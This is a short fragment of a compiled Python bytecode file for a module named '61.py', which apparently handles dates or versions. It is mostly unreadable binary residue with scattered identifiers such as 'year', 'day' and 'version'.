   ValueErrort   currentt   yearR�   t   but   dayR�   R�   R   R#   R,   R7   R9   R8   R:   R*   R�   R�   R�   R�   R�   R�   t   __name__t   versiont   pythonR)   (    (    (    s   61.pyt   <module>   s�   



'		*

			
							7	=	^	p	>	|	�	�%


